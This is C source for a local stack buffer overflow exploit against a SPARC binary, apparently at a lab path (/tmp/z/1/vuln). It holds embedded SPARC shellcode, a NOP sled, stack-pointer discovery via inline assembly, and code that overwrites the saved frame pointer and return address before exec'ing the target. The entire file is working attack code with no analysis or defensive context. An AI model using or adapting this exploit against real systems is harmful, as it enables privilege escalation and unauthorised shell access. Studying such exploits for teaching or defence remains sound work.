#include <stdio.h>

#define BIN "/tmp/z/1/vuln"
#define SIZE 592 // buffer size + 80 = %i7 (retaddr) overwritten ;]

static char sc[] = 
"\x21\x12\x19\x5b\xa0\x14\x20\x6c\x23\x1b\xcb\x08\xa2\x14\x60\x57\x25\x1b\xdc\x9b\xa4\x14\xa0\x64\x27\x08\x42\x80\x90\x10\x20\x01\x92\x0b\x80\x0e\x94\x10\x20\x0e\x82\x10\x24\x04\x84\x03\xe0\x08\x91\xd0\x20\x08\x82\x10\x24\x01";

static char nop[] = "\xac\x15\xa1\x6e"; /* SPARC NOP */

unsigned long get_sp(void)
{

     __asm__("or %sp,%sp,%i0"); /* or *stack pointer*,*stack pointer*,*in* */

}

main()
{

     char buffer[SIZE], *ptr;
     int align, i;
     unsigned long retaddr, sp;

     retaddr = sp = get_sp();

if((align = retaddr % 4))
{

     retaddr &= ~(align);

}

     memset(buffer, 0, SIZE);

for(i = 0; i < SIZE; i += 4)
{

     strcpy(&buffer[i], nop);

}

     memcpy((buffer + SIZE - strlen(sc) - 8), sc, strlen(sc));

     ptr = &buffer[SIZE-8];

     /* set fp (frame pointer / %fp) to a save stack value */
     *(ptr++) = (sp >> 24) & 0xff;
     *(ptr++) = (sp >> 16) & 0xff;
     *(ptr++) = (sp >> 8) & 0xff;
     *(ptr++) = (sp) & 0xff;

     /* overwrite saved PC */
     *(ptr++) = (retaddr >> 24) & 0xff;
     *(ptr++) = (retaddr >> 16) & 0xff;
     *(ptr++) = (retaddr >> 8) & 0xff;
     *(ptr++) = (retaddr) & 0xff;

     buffer[SIZE - 1] = 0;

     printf("\nUsing retaddr: 0x%x\n\n", retaddr);

     execl(BIN, BIN, buffer, NULL);

     return 0;

}
